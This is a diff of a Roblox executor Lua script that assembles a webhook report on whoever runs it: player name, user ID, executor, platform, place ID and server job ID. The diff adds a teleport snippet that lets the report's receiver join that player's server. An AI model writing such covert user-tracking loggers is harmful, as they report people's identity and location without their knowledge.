@@ -50,32 +50,37 @@ local platformStr = detectPlatform()
 
 local embed = {
     title = "Script Executed",
-    url = nil, 
     author = {
         name = player.DisplayName or player.Name,
         url = profileUrl,
-        icon_url = "https://www.roblox.com/thumbnail/...", 
+        icon_url = "https://www.roblox.com/thumbnail/...",
     },
-    description = ("executor: **%s**"):format(executorStr),
+    description = ("Thumbnail nonfunctional"):format(executorStr),
     fields = {
         { name = "Username", value = tostring(player.Name), inline = true },
-        { name = "User ID", value = tostring(player.UserId), inline = true },
+        { name = "User ID", value = ("```%s```"):format(tostring(player.UserId)), inline = true },
         { name = "Executor", value = executorStr, inline = true },
         { name = "Platform", value = platformStr, inline = true },
         { name = "Game Name", value = safeGetGameName(), inline = false },
-        { name = "Place ID", value = tostring(game.PlaceId), inline = true },
-        { name = "Job ID", value = tostring(game.JobId), inline = true },
+        { name = "Place ID", value = ("```%s```"):format(tostring(game.PlaceId)), inline = true },
+        { name = "Job ID", value = ("```%s```"):format(tostring(game.JobId)), inline = true },
+        {
+            name = "Executor Teleport",
+            value = "```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal Players = game:GetService('Players')\nlocal player = Players.LocalPlayer\nTeleportService:TeleportToPlaceInstance(\"9391468976\", \"b2caa515-32a1-4bcd-8e1d-ffe2c1f469dd\", player)\n```",
+            inline = false
+        },
     },
-    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time()), 
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time()),
     color = 16711680
 }
 
 local payloadTable = {
-    username = "Statistic Bot", 
+    username = "Statistic Bot",
     embeds = { embed }
 }
 
 local payloadJson = HttpService:JSONEncode(payloadTable)
+
 
 if type(request) ~= "function" then
     warn("request() not available in this environment. This script is meant for executor/testing environments only.")
